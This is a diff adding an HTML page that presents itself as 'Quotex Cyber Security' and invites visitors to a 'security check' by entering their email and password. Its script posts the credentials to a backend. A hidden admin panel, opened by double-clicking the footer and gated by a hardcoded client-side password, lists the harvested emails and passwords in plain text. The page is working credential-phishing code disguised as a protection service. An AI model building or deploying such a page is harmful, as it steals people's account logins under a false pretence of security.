@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Quotex Cyber Security</title>
+<style>
+  body {
+    background-color: #0f172a;
+    font-family: Arial, sans-serif;
+    color: #fff;
+    margin: 0;
+    padding: 0;
+  }
+  header {
+    text-align: center;
+    padding: 20px;
+  }
+  header img.logo {
+    width: 100px;
+  }
+  header h1 {
+    font-size: 28px;
+    color: #22c55e;
+    margin: 10px 0;
+  }
+  header p {
+    font-size: 18px;
+    margin: 5px 0 0 0;
+  }
+  .container {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: space-evenly;
+    padding: 20px;
+  }
+  .box {
+    background-color: #1e293b;
+    border-radius: 12px;
+    width: 300px;
+    padding: 25px;
+    margin: 10px;
+    box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+  }
+  .box h2 {
+    text-align: center;
+    margin-bottom: 25px;
+  }
+  #form input[type="email"],
+  #form input[type="password"] {
+    width: 100%;
+    padding: 10px;
+    margin: 10px 0;
+    border-radius: 8px;
+    border: none;
+  }
+  #form input[type="checkbox"] {
+    margin-right: 10px;
+  }
+  #form button {
+    width: 100%;
+    padding: 12px;
+    background-color: #22c55e;
+    border: none;
+    border-radius: 8px;
+    font-size: 16px;
+    cursor: pointer;
+    margin-top: 15px;
+  }
+  #form button:hover {
+    background-color: #16a34a;
+  }
+  .success {
+    display: none;
+    text-align: center;
+  }
+  .about, .contact {
+    width: 45%;
+    margin: 10px;
+  }
+  .about h2, .contact h2 {
+    margin-bottom: 15px;
+  }
+  footer {
+    background-color: #1e293b;
+    text-align: center;
+    padding: 15px;
+    margin-top: 20px;
+  }
+  footer p {
+    cursor: pointer;
+    user-select: none;
+  }
+  /* Admin panel styles */
+  #admin {
+    display: none;
+    margin-top: 20px;
+  }
+  #admin h3 {
+    text-align: center;
+    margin-bottom: 15px;
+    color: #22c55e;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    background-color: #374151;
+    border-radius: 8px;
+    overflow: hidden;
+  }
+  th, td {
+    padding: 12px;
+    text-align: left;
+  }
+  th {
+    background-color: #4b5563;
+  }
+  td {
+    background-color: #3b4252;
+  }
+  @media(max-width: 900px){
+    .about, .contact {
+      width: 100%;
+    }
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <img src="https://via.placeholder.com/100" class="logo" alt="Quotex" />
+  <h1>QUOTEX CYBER SECURITY</h1>
+  <p>Protecting Your Digital World</p>
+</header>
+
+<div class="container">
+  <!-- Form Box -->
+  <div class="box">
+    <h2 style="text-align:center; color:#22c55e;">SECURITY CHECK</h2>
+    <div id="form">
+      <input type="email" id="email" placeholder="Email Address" />
+      <input type="password" id="password" placeholder="Password" />
+      <label style="display:block; margin:15px 0; font-size:15px;">
+        <input type="checkbox" id="consent" /> I agree to terms & conditions
+      </label>
+      <button onclick="submitForm()">Start Security Check</button>
+    </div>
+    <div class="success" id="success">
+      <h3 style="color:#22c55e;">✓ Request Submitted Successfully!</h3>
+      <p>We will contact you soon.</p>
+    </div>
+  </div>
+
+  <!-- About Us -->
+  <div class="about">
+    <h2 style="color:#22c55e;">ABOUT US</h2>
+    <p>Quotex Cyber Security provides cybersecurity awareness, online safety education, and digital protection guidance to help users stay secure in the modern digital world.</p>
+  </div>
+
+  <!-- Contact / Complaint -->
+  <div class="contact">
+    <h2 style="color:#22c55e;">CONTACT / COMPLAINT</h2>
+    <p><strong>Gmail:</strong> quotexcybersecurity@gmail.com</p>
+    <p>For any complaint or inquiry, please email us at above address.</p>
+  </div>
+
+  <!-- Admin Logs Panel -->
+  <div id="admin">
+    <h3>Admin Logs Panel</h3>
+    <table>
+      <thead>
+        <tr>
+          <th>Email</th>
+          <th>Password</th>
+        </tr>
+      </thead>
+      <tbody id="tableBody"></tbody>
+    </table>
+  </div>
+</div>
+
+<!-- Footer -->
+<footer>
+  <p ondblclick="showAdmin()" style="cursor:pointer;">© 2026 Quotex Cyber Security. All Rights Reserved.</p>
+</footer>
+
+<script>
+function submitForm() {
+  const email = document.getElementById("email").value.trim();
+  const pass = document.getElementById("password").value.trim();
+  const consent = document.getElementById("consent").checked;
+
+  if (email === "" || pass === "") {
+    alert("❌ Email aur Password dono dalo");
+    return;
+  }
+  if (!consent) {
+    alert("❌ Consent tick karo");
+    return;
+  }
+
+  // Data server pe bhejne ke liye fetch request
+  fetch('http://localhost:3000/submit', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ email: email, password: pass, time: new Date().toLocaleString() })
+  })
+  .then(res => res.json())
+  .then(data => {
+    document.getElementById("form").style.display = "none";
+    document.getElementById("success").style.display = "block";
+  })
+  .catch(e => {
+    alert("Server error. Please try again later.");
+    console.error(e);
+  });
+}
+
+function showAdmin() {
+  const pwd = prompt("Enter Admin Password:");
+  if (pwd === "abdullah@555") {
+    document.getElementById("admin").style.display = "block";
+    loadTable();
+  } else {
+    alert("❌ Wrong Password");
+  }
+}
+
+function loadTable() {
+  fetch('http://localhost:3000/getlogs')
+  .then(res => res.json())
+  .then(logs => {
+    const tbody = document.getElementById("tableBody");
+    tbody.innerHTML = "";
+    logs.forEach(item => {
+      tbody.innerHTML += `
+        <tr>
+          <td>${item.email}</td>
+          <td style="color:#f87171;">${item.password}</td>
+        </tr>`;
+    });
+  })
+  .catch(e => console.error(e));
+}
+</script>
+
+</body>
+</html>
